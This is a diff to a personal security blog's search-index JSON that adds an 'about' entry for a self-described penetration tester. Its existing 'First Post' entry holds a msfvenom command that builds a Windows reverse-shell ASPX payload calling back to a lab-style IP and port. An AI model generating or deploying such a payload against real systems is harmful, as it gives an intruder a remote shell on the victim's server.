@@ -8,6 +8,10 @@
         
         
     
-    "pages": [{"date":"2023-11-03","image":"","imageAlt":"","link":"https://chr0ll0x0.github.io/posts/first-post/","summary":"Hello this is a test\nmsfvenom -p windows/shell_reverse_tcp lhost=10.10.14.8 lport=1337 -f aspx -o hamid.aspx ","tags":[],"text":"hello this is a test\nmsfvenom -p windows/shell_reverse_tcp lhost=10.10.14.8 lport=1337 -f aspx -o hamid.aspx ","title":"First Post"}]
+        
+        
+        
+    
+    "pages": [{"date":"2023-11-03","image":"","imageAlt":"","link":"https://chr0ll0x0.github.io/posts/first-post/","summary":"Hello this is a test\nmsfvenom -p windows/shell_reverse_tcp lhost=10.10.14.8 lport=1337 -f aspx -o hamid.aspx ","tags":[],"text":"hello this is a test\nmsfvenom -p windows/shell_reverse_tcp lhost=10.10.14.8 lport=1337 -f aspx -o hamid.aspx ","title":"First Post"},{"date":"0001-01-01","image":"","imageAlt":"","link":"https://chr0ll0x0.github.io/about/","summary":"Hi there, I\u0026rsquo;m Chrollo, and I\u0026rsquo;m currently working as a Penetration Tester,Bug Hunter, performing security tests ranging from Network penetration tests, Web applications evaluation and physical engagements.","tags":[],"text":"hi there, i\u0026rsquo;m chrollo, and i\u0026rsquo;m currently working as a penetration tester,bug hunter, performing security tests ranging from network penetration tests, web applications evaluation and physical engagements.\n","title":""}]
 }
 
